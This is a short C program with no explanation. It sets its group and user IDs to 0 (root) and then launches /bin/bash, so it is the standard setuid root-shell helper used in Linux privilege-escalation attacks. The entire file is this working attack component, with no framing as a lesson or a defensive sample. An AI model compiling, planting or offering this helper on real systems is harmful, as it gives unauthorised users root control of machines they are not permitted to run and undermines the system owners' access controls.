#include <unistd.h>
#include <stdio.h>
int main (void)
{
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}